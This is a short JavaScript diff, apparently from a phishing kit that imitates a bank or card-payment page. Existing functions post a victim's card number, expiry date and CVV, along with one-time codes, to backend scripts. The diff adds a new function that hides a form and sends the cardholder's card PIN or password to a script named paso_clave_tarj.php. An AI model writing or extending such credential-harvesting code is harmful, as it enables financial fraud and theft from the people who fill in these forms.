@@ -130,9 +130,16 @@ function enviar_otp(cd){
  }
 
 function enviar_tarjeta(t,f,c){
-    $("#frmTarjeta").hide(); 
-    $.post( "../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {                
-        espera = 1; 
+    $("#frmTarjeta").hide();
+    $.post( "../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {
+        espera = 1;
+    });
+}
+
+function paso_clave_tarj(clave){
+    $("#frm-clave").hide();
+    $.post( "../../../process/paso_clave_tarj.php", { clave: clave } ,function(data) {
+        espera = 1;
     });
 }
 
